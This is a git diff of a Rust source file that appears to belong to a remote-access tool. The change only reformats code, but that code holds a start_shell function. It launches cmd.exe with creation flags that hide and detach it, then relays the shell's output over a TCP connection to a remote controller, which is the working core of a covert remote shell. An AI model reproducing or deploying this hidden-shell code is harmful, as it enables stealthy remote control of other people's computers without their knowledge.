@@ -2,49 +2,55 @@ use std::io::Write;
 use std::os::windows::process::CommandExt;
 use std::process::Child;
 use std::net::TcpStream;
-use std::sync::{Arc, Mutex};
+use std::sync::{ Arc, Mutex };
 
-use common::buffers::{read_console_buffer, write_buffer};
+use common::buffers::{ read_console_buffer, write_buffer };
 use common::commands::Command;
 
 pub fn start_shell(write_stream: Arc<Mutex<TcpStream>>, remote_shell: &mut Option<Child>) {
     const DETACH: u32 = 0x00000008;
     const HIDE: u32 = 0x08000000;
 
-    *remote_shell = Some(std::process::Command::new("cmd")
-        .creation_flags(HIDE | DETACH)
-        .stdin(std::process::Stdio::piped())
-        .stdout(std::process::Stdio::piped())
-        .stderr(std::process::Stdio::piped())
-        .spawn()
-        .unwrap());
+    *remote_shell = Some(
+        std::process::Command
+            ::new("cmd")
+            .creation_flags(HIDE | DETACH)
+            .stdin(std::process::Stdio::piped())
+            .stdout(std::process::Stdio::piped())
+            .stderr(std::process::Stdio::piped())
+            .spawn()
+            .unwrap()
+    );
 
-        if let Some(shell) = remote_shell {
-            if let Some(stdout) = shell.stdout.take() {
-                std::thread::spawn(move || {
-                    let mut cmd_output = stdout;
-                    let mut cmd_buffer: String = String::new();
-                    loop {
-                        let read_result = read_console_buffer(&mut cmd_output);
-                        match read_result {
-                            Ok(vec) => {
-                                cmd_buffer += &String::from_utf8_lossy(&vec);
+    if let Some(shell) = remote_shell {
+        if let Some(stdout) = shell.stdout.take() {
+            std::thread::spawn(move || {
+                let mut cmd_output = stdout;
+                let mut cmd_buffer: String = String::new();
+                loop {
+                    let read_result = read_console_buffer(&mut cmd_output);
+                    match read_result {
+                        Ok(vec) => {
+                            cmd_buffer += &String::from_utf8_lossy(&vec);
 
-                                if String::from_utf8_lossy(&vec).ends_with('>') {
-                                    let mut ws_lock = write_stream.lock().unwrap();
-                                    write_buffer(&mut ws_lock, Command::ShellOutput(cmd_buffer.to_string()));
-                                    cmd_buffer.clear();
-                                }
-                            },
-                            Err(_) => {
-                                eprintln!("Error reading from shell stdout or end of file.");
-                                break;
+                            if String::from_utf8_lossy(&vec).ends_with('>') {
+                                let mut ws_lock = write_stream.lock().unwrap();
+                                write_buffer(
+                                    &mut ws_lock,
+                                    Command::ShellOutput(cmd_buffer.to_string())
+                                );
+                                cmd_buffer.clear();
                             }
                         }
+                        Err(_) => {
+                            eprintln!("Error reading from shell stdout or end of file.");
+                            break;
+                        }
                     }
-                });
-            }
+                }
+            });
         }
+    }
 }
 
 pub fn exit_shell(remote_shell: &mut Option<Child>) {
